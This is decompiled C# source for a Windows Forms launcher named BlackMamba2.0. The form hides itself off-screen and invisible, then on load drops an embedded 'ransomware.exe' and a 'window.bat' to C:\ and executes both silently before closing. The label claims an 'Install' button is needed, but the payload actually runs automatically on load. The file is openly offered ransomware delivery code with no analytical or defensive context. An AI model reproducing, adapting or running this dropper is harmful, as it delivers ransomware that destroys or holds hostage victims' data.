using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using BlackMamba2.Properties;

namespace BlackMamba2;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_Size(new Size(50, 50));
		((Form)this).set_Location(new Point(-100, -100));
		string text = "C:\\";
		File.WriteAllBytes(text + "ransomware.exe", Resources.ransomware);
		File.WriteAllBytes("C:\\ransomware.exe", Resources.ransomware);
		Process.Start("C:\\ransomware.exe");
		string text2 = "C:\\";
		File.WriteAllBytes(text2 + "window.bat", Resources.window);
		ProcessStartInfo processStartInfo = new ProcessStartInfo("C:\\window.bat");
		processStartInfo.CreateNoWindow = true;
		processStartInfo.UseShellExecute = false;
		Process.Start(processStartInfo);
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_Location(new Point(1, 24));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(421, 20));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Click \"Install\" button to install BlackMamba2.0 ransomware");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("BlackMamba2.0 Launcher");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
